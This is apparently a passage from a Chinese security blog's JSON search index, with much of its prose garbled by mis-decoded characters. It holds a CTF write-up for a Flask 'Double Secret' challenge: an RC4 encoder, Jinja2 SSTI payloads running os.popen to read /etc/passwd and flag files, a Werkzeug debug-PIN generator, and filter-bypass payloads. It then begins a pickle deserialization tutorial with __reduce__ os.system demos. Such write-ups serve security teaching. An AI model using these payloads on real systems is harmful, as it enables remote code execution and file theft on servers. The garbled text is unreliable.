'/usr/local/lib/python3.7/site-packages/flask/app.py', #app.pyçš„ç»å¯¹è·¯å¾„]private_bits = [ '2485410391036', #macåœ°å€çš„åè¿›åˆ¶æ•° '25f34b1b3cf9815ee85b0089a6203547ca22efbdbbc16f0c39d70fb528f773a1' #æœºå™¨ID]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) çœŸé¢˜å¤ç°BUUCTF: [CISCN2019 åä¸œå—èµ›åŒº]Double Secret è¯·æ±‚é¡µé¢è·å–åˆ°ä¸€å¥è¯Welcome To Find Secret çŒœæµ‹åˆ°å­˜åœ¨secretç›®å½•ï¼Œæˆ–è€…ä½¿ç”¨ç›®å½•æ‰«æä¹Ÿå¯ä»¥å‘ç° ç›´æ¥è¯·æ±‚secretï¼Œè·å–åˆ°ä¸€å¥è¯Tell me your secret.I will encrypt it so others can't see å¯ä»¥ä¼ å‚secret=1ï¼Œè·å–åˆ°å­—æ¯d å†æ¬¡ä¼ å‚åˆ°ä½æ•°è¶…è¿‡5ä½æ—¶ï¼Œå°±è¿”å›flask debugé”™è¯¯è¿”å›é¡µ å¹¶ä¸”é€šè¿‡é”™è¯¯é¡µé¢ï¼Œè·å–åˆ°å…³é”®é”™è¯¯å‡½æ•°å¦‚ä¸‹ æˆ‘ä»¬å‘ç°ä¼ å…¥çš„å€¼åœ¨è¿™é‡Œç»è¿‡ä¸€æ¬¡RC4åŠ å¯†å¤„ç† è¿™é‡ŒRC4æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†ç‰¹ç‚¹æ˜¯æ˜æ–‡åŠ å¯†ä¸€æ¬¡å¾—åˆ°å¯†æ–‡ï¼Œå†åŠ å¯†ä¸€æ¬¡å¾—åˆ°æ˜æ–‡ï¼›æˆ‘ä»¬å‰é¢å°è¯•è¾“å…¥1è¿”å›çš„æ˜¯å­—æ¯dï¼Œæˆ‘ä»¬åœ¨å°è¯•è¾“å…¥dï¼Œæˆ‘ä»¬å‘ç°è¿”å›1 æ ¹æ®è¿™ç§ç‰¹ç‚¹å¯ä»¥å°è¯•è‡ªå·±ç¼–å†™è„šæœ¬ï¼Œæˆ–è€…ä½¿ç”¨åœ¨çº¿çš„è§£å¯†å·¥å…·å‡å¯ï¼Œè¿™é‡Œä½¿ç”¨è§£å¯†è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %quote(cipher)) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))rc4_main(&quot;HereIsTreasure&quot;,&quot;{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}&quot;) è§£æ³•ä¸€ï¼šSSTI payload:{{config}} â€“rc4â€“&gt; .%14ZZ%C2%A4%01%02iv%C2%80 å‘ç°è¢«æ­£å¸¸æ‰§è¡Œäº†ï¼Œè¯´æ˜å­˜åœ¨sstiï¼Œæ ¹æ®å·²çŸ¥ä¿¡æ¯æ”¶é›†ï¼ŒçŸ¥é“ç›®æ ‡æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯python2.7ç›´æ¥è°ƒç”¨è¯¥payloadå‘½ä»¤æ‰§è¡Œ payload:{{{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}}} â€“rc4â€“&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%2CH%22%C2%95%C2%A6%C2%89%27~%C2%A8kJ%08%C3%8C payload:{{{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag.txt').read()}}}} â€“rc4â€“&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%26Mq%C2%9C%C2%A7%C2%9D.~%C2%ABm%17%0D%C3%85%27%C3%99G%C2%90%C2%9D%C3%BE/%C2%B6%C3%AAHt è§£æ³•äºŒï¼šPINç  username:glzjin modename:flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')): Flask app path:/usr/local/lib/python2.7/site-packages/flask/app.pyc è·å–str(uuid.getnode()) 02:42:ac:10:9d:88 â€“&gt; 2485377867144 payload:{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /sys/class/net/eth0/address').read()}} â€“rc4â€“&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%26Mq%C2%9C%C2%A7%C2%88%3Bl%C3%A3%20%0F%14%C3%82s%C3%9F%07%C2%87%C2%8C%C2%B0.%C3%AA%C2%AB%05%26%C3%AB%C3%9B%2B%C2%91i%5E%40~%C2%93%C3%81%C2%B4%C2%AD%C3%B8%C2%8Cv%1E%2Cs è·å–machine_id ee17edd855b51ea282681156d5459c250943922600b4b8294e17deae3607e137 payload:{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /proc/self/cgroup').read()}} â€“rc4â€“&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%26Mq%C2%9C%C2%A7%C2%8B0p%C2%AFl%10%10%C3%9Df%C3%9F%0A%C2%85%C2%8A%C3%B0%3E%C3%AE%C3%A4%1C%27%C3%B8%C3%9A.%C2%87%24%04N%24 è·å–å…­ä¸ªå…ƒç´ å,ç›´æ¥åˆ©ç”¨PINè„šæœ¬è·å–pinç  252-519-893 ç›´æ¥é”®å…¥PINç è·å–äº¤äº’consoleï¼Œæ‰§è¡Œå‘½ä»¤å³å¯ å¸¸è§çš„æ²™ç®±é€ƒé€¸è¿‡æ»¤ä¸­æ‹¬å·pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚ 1''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() åœ¨è¿™é‡Œä½¿ç”¨popå¹¶ä¸ä¼šçœŸçš„ç§»é™¤,ä½†å´èƒ½è¿”å›å…¶å€¼,å–ä»£ä¸­æ‹¬å·,æ¥å®ç°ç»•è¿‡ è¿‡æ»¤å¼•å·request.args æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,è¿™é‡ŒæŠŠpathå½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ 1{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd è¿‡æ»¤åŒä¸‹åˆ’çº¿åŒæ ·åˆ©ç”¨request.argså±æ€§ 1{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚ 1234GET:{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }}POST:class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ è¿‡æ»¤å…³é”®å­—base64ç¼–ç ç»•è¿‡__getattribute__ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³• ä¾‹å¦‚è¢«è¿‡æ»¤æ‰__class__å…³é”®è¯ 1{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()}} å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ 1{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()}} åŒæ—¶ç»•è¿‡ä¸‹åˆ’çº¿ã€ä¸ä¸­æ‹¬å·123{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')|attr(request.values.name5)()}}post:name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read ç»•è¿‡.è¿‡æ»¤è‹¥.ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°|attr()å°†request.__class__æ”¹æˆrequest|attr(&quot;__class__&quot;)","link":"/2021/02/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/python-code-audit/python-ssti/"},{"title":"pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–","text":"åŸºç¡€çŸ¥è¯†åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æµç¨‹Python çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªç±»å¯¹è±¡å‘å­—èŠ‚æµè½¬åŒ–ä»è€Œè¿›è¡Œå­˜å‚¨å’Œä¼ è¾“ï¼Œç„¶åä½¿ç”¨çš„æ—¶å€™å†å°†å­—èŠ‚æµè½¬åŒ–å›åŸå§‹çš„å¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚ åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¦‚å¿µåœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰çš„å˜é‡å­˜å‚¨çš„æ•°æ®éƒ½æ˜¯åŠ è½½åœ¨å†…å­˜ä¸­ï¼Œä¸€æ—¦ç¨‹åºç»“æŸï¼Œæ•°æ®æ‰€å ç”¨çš„å†…å­˜å°±è¢«æ“ä½œç³»ç»Ÿå…¨éƒ¨å›æ”¶ã€‚å„ç§ç±»å‹çš„æ•°æ®ä»å†…å­˜ä¸­å˜æˆå¯å­˜å‚¨æˆ–ä¼ è¾“çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºåºåˆ—åŒ–ï¼Œåºåˆ—åŒ–ä¹‹åï¼Œå°±å¯ä»¥æŠŠåºåˆ—åŒ–åçš„å†…å®¹å†™å…¥ç£ç›˜ï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°åˆ«çš„æœºå™¨ä¸Šã€‚åè¿‡æ¥ï¼ŒæŠŠæ•°æ®å†…å®¹ä»åºåˆ—åŒ–çš„å¯¹è±¡é‡æ–°è¯»åˆ°å†…å­˜é‡Œç§°ä¹‹ä¸ºååºåˆ—åŒ–ã€‚ åºåˆ—åŒ–çš„ç›®çš„ ä»¥æŸç§å­˜å‚¨å½¢å¼ä½¿è‡ªå®šä¹‰å¯¹è±¡æŒä¹…åŒ–ï¼› å°†å¯¹è±¡å¯ä»¥ä»ä¸€ä¸ªåœ°æ–¹ä¼ é€’åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼› ä½¿ç¨‹åºæ›´å…·æœ‰ç»´æŠ¤æ€§ã€‚ pythonä¸­åºåˆ—åŒ–æ¨¡å— pickle pickleæ˜¯pythonä¸­å†…å»ºçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¨¡å—ï¼Œä¸”ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–æ•°æ®å­˜å‚¨ï¼Œpickleåºåˆ—åŒ–çš„å†…å®¹åªèƒ½ä½¿ç”¨pythonæ‰èƒ½æ“ä½œï¼Œä¸”ååºåˆ—åŒ–ä¾èµ–ä»£ç ã€‚ json jsonæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œæ˜¯ä¸€ç§é€šç”¨çš„åºåˆ—åŒ–æ ¼å¼ï¼Œå…·æœ‰æ›´å¥½çš„å¯è¯»æ€§å’Œè·¨å¹³å°æ€§ã€‚ shelve æ¨¡å—æ˜¯ Python3 æ–°å‡ºç°çš„æ–¹å¼ï¼Œç‰¹ç‚¹æ˜¯æ“ä½œç®€å•ï¼Œä½¿ç”¨åºåˆ—åŒ–å¥æŸ„ç›´æ¥æ“ä½œï¼Œéå¸¸æ–¹ä¾¿ã€‚ç¼ºç‚¹æ˜¯ç›®å‰ä¸å¤ªå¸¸ç”¨ã€‚ yaml YAMLæ˜¯ä¸€ç§ç›´è§‚çš„èƒ½å¤Ÿè¢«ç”µè„‘è¯†åˆ«çš„çš„æ•°æ®åºåˆ—åŒ–æ ¼å¼ï¼Œå®¹æ˜“è¢«äººç±»é˜…è¯»ï¼Œå¹¶ä¸”å®¹æ˜“å’Œè„šæœ¬è¯­è¨€äº¤äº’ï¼ŒYAMLç±»ä¼¼äºXMLï¼Œä½†æ˜¯è¯­æ³•æ¯”XMLç®€å•å¾—å¤šï¼Œå¯¹äºè½¬åŒ–æˆæ•°ç»„æˆ–å¯ä»¥hashçš„æ•°æ®æ—¶æ˜¯å¾ˆç®€å•æœ‰æ•ˆçš„ã€‚ pickleæ¨¡å—è¯¦è§£pickleåŸºç¡€pickleæ˜¯ä¸€ç§ç‹¬ç«‹çš„åºåˆ—åŒ–æ ˆè¯­è¨€ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ã€‚ åºåˆ—åŒ–å‡½æ•°ï¼š 12pickle.dump(æ–‡ä»¶) pickle.dumps(å­—ç¬¦ä¸²) ååºåˆ—åŒ–å‡½æ•°ï¼š 12pickle.load(æ–‡ä»¶)pickle.loads(å­—ç¬¦ä¸²) pickleå¯åºåˆ—åŒ–çš„å¯¹è±¡ None ã€ True å’Œ False æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•° strã€byteã€bytearray åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰ å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•° å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±» __dict__ å±æ€§å€¼æˆ– __getstate__() å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰ object.__reduce__å‡½æ•° å¼€å‘æ—¶ï¼Œå¯ä»¥é‡å†™ç±»çš„__reduce__æ–¹æ³•ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚è¯¥å‡½æ•°åœ¨è°ƒç”¨æ—¶è¿”å›(callable, ([para1,para2...])[,...])å…ƒç»„ï¼Œè¯¥ç±»åœ¨è¢«unpickleæ—¶ï¼Œå…¶ä¸­çš„callableå°±ä¼šè¢«è°ƒç”¨ç”Ÿæˆå¯¹è±¡ã€‚(å…¶ä¸­callableæ˜¯æ„é€ å‡½æ•°) åœ¨opcodeä¸­ï¼Œ__reduce__çš„æŒ‡ä»¤æ˜¯R,å®ƒæ˜¯é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆè¯¥å¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶ä¸­RçœŸå¥½å¯¹åº”__reduce__å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›å€¼ä½œä¸ºRçš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²ä¹ŸåŒ…å«äº†Rã€‚ demo 12345678910111213#!/usr/local/env python3#-*â€” coding:utf-8 -*-import osimport pickleclass Student(object): def __reduce__(self): return(os.system,('ls',)) obj = Student()serialize = pickle.dumps(obj, protocol=0)print(serialize) 12345678910111213#!/usr/local/env python3#-*â€” coding:utf-8 -*-import osimport pickleclass Student(object): def __reduce__(self): return(os.system,('whoami',)) obj = Student()serialize = pickle.dumps(obj, protocol=0)unserialize = pickle.loads(serialize) pickleè¿‡ç¨‹è¯¦è§£ pickleçš„è§£æä¾é PVM(pickle virtual machine) PVMçš„æ„æˆï¼š1 è§£æå¼•æ“ 2 æ ˆ 3 å†…å­˜ è§£æå¼•æ“ ä»æµä¸­è¯»å–opcodeå’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼ŒçŸ¥é“é‡åˆ°.åœæ­¢ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚ æ ˆ ç”±pythonçš„listå®ç°ï¼Œè¢«ç”¨æ¥çš„ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ memo ç”±pythonçš„dictå®ç°ï¼Œå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥key-valueçš„å½¢å¼å­˜å‚¨åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ã€‚ PVMè§£æstræµç¨‹ PVMè§£æ __reduce__() æµç¨‹ opcodeç‰ˆæœ¬ pickleä¸åŒçš„å®ç°ç‰ˆæœ¬å¾—åˆ°çš„opcodeä¸ç›¸åŒï¼Œä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ï¼Œç›®å‰ä¸€å…±æœ‰å…­ä¸ªç‰ˆæœ¬ 12345678910#!/usr/local/env python3#-*â€” coding:utf-8 -*-import osimport picklea = {'name':'zhang', 'age':19}for i in range(5): print(f'pickleç‰ˆæœ¬{i}', pickle.dumps(a, protocol=i)) è¿è¡Œç»“æœ pickle3ç‰ˆæœ¬çš„opcodeè¯¦è§£: 123456789{'name':'zhang', 'age':19}b'\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00nameq\\x01X\\x05\\x00\\x00\\x00zhangq\\x02X\\x03\\x00\\x00\\x00ageq\\x03K\\x13u.'# \\x80ï¼šåè®®å¤´å£°æ˜ # \\x03ï¼šåè®®ç‰ˆæœ¬# \\x04\\x00\\x00\\x00: æ•°æ®é•¿åº¦4# name: æ•°æ®# qï¼š å­˜å‚¨æ ˆé¡¶çš„å­—ç¬¦ä¸²é•¿åº¦: ä¸€ä¸ªå­—èŠ‚(å³\\x00)# \\x13u:ä»£è¡¨æ ˆé¡¶ä½ç½®# .: æ•°æ®ç»“æŸç¬¦ æŒ‡ä»¤é›† 1234567891011121314151617181920212223242526272829303132333435363738394041424344MARK = b'(' # push special markobject on stackSTOP = b'.' # every pickle ends with STOPPOP = b'0' # discard topmost stack itemPOP_MARK = b'1' # discard stack top through topmost markobjectDUP = b'2' # duplicate top stack itemFLOAT = b'F' # push float object; decimal string argumentINT = b'I' # push integer or bool; decimal string argumentBININT = b'J' # push four-byte signed intBININT1 = b'K' # push 1-byte unsigned intLONG = b'L' # push long; decimal string argumentBININT2 = b'M' # push 2-byte unsigned intNONE = b'N' # push NonePERSID = b'P' # push persistent object; id is taken from string argBINPERSID = b'Q' # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b'R' # apply callable to argtuple, both on stackSTRING = b'S' # push string; NL-terminated string argumentBINSTRING = b'T' # push string; counted binary string argumentSHORT_BINSTRING= b'U' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argumentBINUNICODE = b'X' # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b'a' # append stack top to list below itBUILD = b'b' # call __setstate__ or __dict__.update()GLOBAL = b'c' # push self.find_class(modname, name); 2 string argsDICT = b'd' # build a dict from stack itemsEMPTY_DICT = b'}' # push empty dictAPPENDS = b'e' # extend list on stack by topmost stack sliceGET = b'g' # push item from memo on stack; index is string argBINGET = b'h' # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b'i' # build &amp; push class instanceLONG_BINGET = b'j' # push item from memo on stack; index is 4-byte argLIST = b'l' # build list from topmost stack itemsEMPTY_LIST = b']' # push empty listOBJ = b'o' # build &amp; push class instancePUT = b'p' # store stack top in memo; index is string argBINPUT = b'q' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b'r' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b's' # add key+value pair to dictTUPLE = b't' # build tuple from topmost stack itemsEMPTY_TUPLE = b')' # push empty tupleSETITEMS = b'u' # modify dict by adding topmost key+value pairsBINFLOAT = b'G' # push float; arg is 8-byte float encodingTRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.pyFALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py pickletoolsè¯¥å·¥å…·å¯ä»¥æ–¹ä¾¿çš„æŠŠopcodeä»£ç è½¬åŒ–æˆè‚‰çœ¼ä¾¿äºé˜…è¯»çš„å½¢å¼ã€‚pickletoolsæ˜¯pythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šåæ±‡ç¼–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€ä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€è¿”å›ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨ã€‚ 12345678#!/usr/local/env python3#-*â€” coding:utf-8 -*-import pickletoolsdata = b&quot;\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00nameq\\x01X\\x05\\x00\\x00\\x00zhangq\\x02X\\x03\\x00\\x00\\x00ageq\\x03K\\x13u.&quot;pickletools.dis(data) å¾—åˆ°åŸå§‹å­—ç¬¦ä¸²çš„åæ±‡ç¼–ç»“æœï¼š åæ±‡ç¼–åŠŸèƒ½ï¼šè§£æå­—ç¬¦ä¸²ï¼Œå‘Šè¯‰ä½ è¿™ä¸ªå­—ç¬¦ä¸²åšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªæŒ‡ä»¤ã€‚ ä¼˜åŒ–åŠŸèƒ½: 12345678910#!/usr/local/env python3#-*â€” coding:utf-8 -*-import pickletoolsdata = b&quot;\\x80\\x03}q\\x00(X\\x04\\x00\\x00\\x00nameq\\x01X\\x05\\x00\\x00\\x00zhangq\\x02X\\x03\\x00\\x00\\x00ageq\\x03K\\x13u.&quot;data = pickletools.optimize(data)pickletools.dis(data) è¿è¡Œç»“æœï¼š é€šè¿‡ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°å­—ç¬¦ä¸²æ¯”åŸæ¥çŸ­äº†å¾ˆå¤šï¼Œè€Œä¸”åæ±‡ç¼–ç»“æœä¸­ï¼ŒBINPUTæŒ‡ä»¤æ²¡æœ‰äº†ã€‚è¿™é‡Œçš„â€œä¼˜åŒ–â€ï¼Œå°±æ˜¯æŠŠä¸å¿…è¦çš„putæŒ‡ä»¤ç»™åˆ æ‰ã€‚è¿™é‡Œçš„putæ„æ€å°±æ˜¯æŠŠå½“å‰æ ˆçš„æ ˆé¡¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¾è¿›å­˜å‚¨åŒºã€‚ pickleååºåˆ—åŒ–æ¼æ´åŸºæœ¬æè¿°å®˜æ–¹ç»™å®šçš„pickleååºåˆ—åŒ–åŠŸèƒ½æ˜¯å®‰å…¨çš„ï¼Œä¸”å®˜æ–¹åªæ˜¯æä¾›è¿™ä¸ªååºåˆ—åŒ–åŠŸèƒ½ï¼Œå…¶ä¸å®‰å…¨çš„é—®é¢˜äº§ç”Ÿï¼Œä¸»è¦ç”±äºä¼ å…¥äº†ä¸å®‰å…¨çš„åºåˆ—åŒ–å†…å®¹ï¼Œå¯¼è‡´äº†ä¸å®‰å…¨é—®é¢˜çš„äº§ç”Ÿã€‚ æ¼æ´äº§ç”Ÿçš„åœºæ™¯ webæœåŠ¡å™¨è§£æè®¤è¯tokenã€sessionå€¼æ—¶ å¾ˆå¤šwebéƒ½ä½¿ç”¨redisã€mongodbã€memcachedç­‰æ¥å­˜å‚¨sessionç­‰çŠ¶æ€ä¿¡æ¯ã€‚ 